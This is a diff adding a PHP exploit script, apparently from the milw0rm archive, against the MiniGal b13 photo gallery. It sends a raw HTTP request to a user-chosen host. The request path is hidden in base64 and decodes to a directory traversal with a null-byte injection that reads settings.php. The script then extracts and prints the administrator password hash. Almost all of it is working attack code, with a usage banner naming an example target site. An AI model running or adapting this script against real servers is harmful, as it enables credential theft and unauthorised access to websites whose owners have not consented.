@@ -1,0 +1,54 @@
+<?php 
+set_time_limit(0);
+function find_pass($data){
+         $pass = explode('$adminpass = "',$data);
+         if($pass[1]!=""){
+            echo("Vuln exploited enjoy !\n");
+            sleep(1);    
+            echo("Admin hash == [".substr($pass[1],0,32)."]\n");
+         }
+         else{ 
+             echo("Exploit failed!!!!");
+         }
+}               
+function __send($pack,$host,$port){
+        $ret = "";
+        $desc = fsockopen($host,$port,$errno, $errstr, 30);
+        if(!$desc){ 
+           echo("Socket say:($errno).[$errstr]"); 
+           return;
+           }
+           echo("Sending payload !!\n");
+           fwrite($desc,$pack);
+           while(!feof($desc)){
+                $ret.=fgets($desc);   
+           }
+        fclose($desc);  
+        find_pass($ret);
+        flush();
+}           
+
+echo("\n=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n".
+     "+       MiniGal b13 Source Code Disclosure       +\n".
+     "+               Alfons Luja                      +\n".
+     "+  --------------------------------------------  +\n".
+     "+       Usage poc.php path host port             +\n".
+     "+    ex: poc.php /press/ wwww.doda.net.pl 80     +\n".
+     "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n");
+     
+if($argc<3){ die("Path - host - Port - comprendo ?"); }
+
+$path = $argv[1];
+$host = $argv[2];
+$port = $argv[3];
+
+$packet = "GET ".$path.base64_decode("aW5kZXgucGhwP2xpc3Q9Li4vc2V0dGluZ3MucGhwJTAwIEhUVFAvMS4x")."\r\n";
+$packet .= "Host:".$host."\r\n";
+$packet .= "Keep-Alive: 300\r\n";
+$packet .= "Connection: keep-alive\r\n\r\n";
+echo("\nConnecting to $host\n");
+__send($packet,$host,$port);
+
+?>         
+
+# milw0rm.com [2008-11-15]
